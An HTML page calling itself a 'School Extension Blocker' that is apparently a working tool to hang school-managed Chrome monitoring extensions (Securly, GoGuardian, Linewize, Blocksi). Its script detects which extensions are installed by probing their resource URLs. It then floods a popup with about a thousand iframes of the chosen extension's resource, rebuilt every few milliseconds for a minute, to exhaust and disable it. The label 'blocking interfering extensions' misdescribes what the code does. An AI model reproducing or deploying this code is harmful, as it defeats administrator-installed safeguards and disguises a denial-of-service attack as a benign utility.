<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>School Extension Blocker</title>
  <link rel="shortcut icon" type="image/png" href="https://raw.githubusercontent.com/Blobby-Boi/ExtHang3r/main/favicon.png">
  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Varela+Round&display=swap">
  <style>
    /* CSS Styles */
    body {
      font-family: 'Varela Round', sans-serif;
      margin: 0;
      padding: 0;
      background-color: #f8f9fa;
      color: #333;
    }
    header {
      background-color: #343a40;
      color: #fff;
      padding: 10px 20px;
      text-align: center;
      display: flex;
      align-items: center;
      justify-content: center;
      box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
    }
    .logo {
      width: 50px;
      height: 50px;
      margin-right: 10px;
    }
    .container {
      max-width: 800px;
      margin: 150px auto 0 auto;
      padding: 20px;
      text-align: center;
      background: #fff;
      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
      border-radius: 8px;
    }
    select {
      font-family: 'Varela Round', sans-serif;
      margin-bottom: 10px;
      padding: 10px;
      font-size: 16px;
      border: 1px solid #ced4da;
      border-radius: 4px;
      width: 100%;
    }
    button {
      font-family: 'Varela Round', sans-serif;
      background-color: #007bff;
      color: #fff;
      border: none;
      padding: 10px 20px;
      font-size: 16px;
      cursor: pointer;
      border-radius: 5px;
      margin-top: 10px;
      transition: background-color 0.3s ease;
    }
    button:hover {
      background-color: #0056b3;
    }
    .overlay {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background-color: rgba(0, 0, 0, 0.7);
      display: none;
      justify-content: center;
      align-items: center;
      z-index: 9999;
      color: #fff;
      font-size: 24px;
      user-select: none;
      flex-direction: column;
    }
    .spinner {
      border: 6px solid rgba(255, 255, 255, 0.3);
      border-top: 6px solid #fff;
      border-radius: 50%;
      width: 40px;
      height: 40px;
      animation: spin 1s linear infinite;
      margin-bottom: 20px;
    }
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
    #blockExtensionText {
      display: none;
      margin-top: 20px;
      color: #333;
      font-size: 18px;
      text-align: center;
      background: #e9ecef;
      padding: 20px;
      border-radius: 8px;
      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
    }
    #blockButton {
      display: none;
      background-color: #dc3545;
      color: #fff;
      border: none;
      padding: 10px 20px;
      font-size: 16px;
      cursor: pointer;
      border-radius: 5px;
      transition: background-color 0.3s ease;
    }

    #blockButton:hover {
      background-color: #9c1c28;
    }
    footer {
      background-color: #343a40;
      color: #fff;
      text-align: center;
      padding: 10px;
      position: fixed;
      bottom: 0;
      width: 100%;
    }
    footer a {
      color: #007bff;
      text-decoration: none;
    }
    footer a:hover {
      text-decoration: underline;
    }
  </style>
</head>
<body>

<header>
  <img src="https://blobby-boi.github.io/BlobbypassXSS/favicon.png" alt="Logo" class="logo">
  <h1>Super School Tools - Extension Blocker</h1>
</header>

<div class="container">
  <p>Super School Tools: Block Chrome extensions that may interfere with the educational environment.</p>
  <label for="iframeSelect" id="labelForIframeSelect">Select an extension to block:</label>
  <select id="iframeSelect">
  </select>
  <button onclick="warning();" id="hangButton">Block Extension!</button>
  <button id="blockButton" onclick="openExtensionPopup();">Finalize Blocking!</button>
</div>

<div class="overlay" id="overlay">
  <div class="spinner"></div>
  Blocking... (This will take about 1 minute)
</div>
<div id="blockExtensionText"></div>

<footer>
  <p>Made by <a href="https://github.com/Blobby-Boi/">Super School Tools</a></p>
</footer>

<script>
  /* JavaScript */
  async function checkExtensionURL(url) {
    try {
      const response = await fetch(url);
      return response.ok;
    } catch (error) {
      return false;
    }
  }

  async function populateSelectOptions() {
    const selectElement = document.getElementById("iframeSelect");
    const extensions = {
      "Securly": "chrome-extension://joflmkccibkooplaeoinecjbmdebglab/fonts/Metropolis.css",
      "GoGuardian": "chrome-extension://haldlgldplgnggkjaafhelgiaglafanh/youtube_injection.js",
      "Linewize": "chrome-extension://ddfbkhpmcdbciejenfcolaaiebnjcbfc/background/assets/pages/default-blocked.html",
      "Blocksi": "chrome-extension://ghlpmldmjjhmdgmneoaibbegkjjbonbk/pages/blockPage.html",
    };
    let hasSupportedExtensions = false;

    for (const [name, url] of Object.entries(extensions)) {
      if (await checkExtensionURL(url)) {
        const option = document.createElement("option");
        option.value = url;
        option.textContent = name;
        selectElement.appendChild(option);
        hasSupportedExtensions = true;
      }
    }

    if (!hasSupportedExtensions) {
      const option = document.createElement("option");
      option.value = "";
      option.textContent = "No supported extensions installed";
      selectElement.appendChild(option);
      document.getElementById("hangButton").style.display = "none";
    }
  }

  populateSelectOptions();

  function replaceIframes(container, iframeSrc) {
    for (var i = 0; i < 1000; i++) {
      var iframe = document.createElement('iframe');
      iframe.src = iframeSrc;
      iframe.style.width = '100%';
      iframe.style.height = '100px';
      container.appendChild(iframe);
    }
    setTimeout(function() {
      while (container.firstChild) {
        container.removeChild(container.firstChild);
      }
      replaceIframes(container, iframeSrc);
    }, 5);
  }

  function warning() {
    var overlay = document.getElementById("overlay");
    overlay.style.display = "flex";
    var iframeSelect = document.getElementById("iframeSelect");
    var selectedOption = iframeSelect.options[iframeSelect.selectedIndex].text;
    var selectedSrc = iframeSelect.value;
    var popup = window.open("", "PopupWindow", "width=100,height=100");
    var popupDocument = popup.document;
    var popupBody = popupDocument.body;
    var iframeContainer = popupDocument.createElement('div');
    iframeContainer.id = 'iframeContainer';
    popupBody.appendChild(iframeContainer);
    replaceIframes(iframeContainer, selectedSrc);
    setTimeout(function() {
      popup.close();
      var extensionId = selectedSrc.substring(selectedSrc.indexOf("//") + 2, selectedSrc.indexOf("/", selectedSrc.indexOf("//") + 2));
      var blockExtensionText = document.getElementById("blockExtensionText");
      blockExtensionText.innerHTML = "Now that the extension <strong>" + selectedOption + "</strong> has been prepared, press the button above.";
      setTimeout(function() {
        overlay.style.display = "none";
        blockExtensionText.style.display = "block";
        document.getElementById("blockButton").style.display = "inline-block";
        document.getElementById("hangButton").style.display = "none";
        document.getElementById("iframeSelect").style.display = "none";
        document.getElementById("labelForIframeSelect").style.display = "none";
      }, 1000);
    }, 60000);
  }

  function openExtensionPopup() {
    var popupWindow = window.open("", "_blank", "width=800,height=600");
    popupWindow.document.body.innerHTML = "<h1>Extension is being blocked!</h1>";
  }
</script>
</body>
</html>
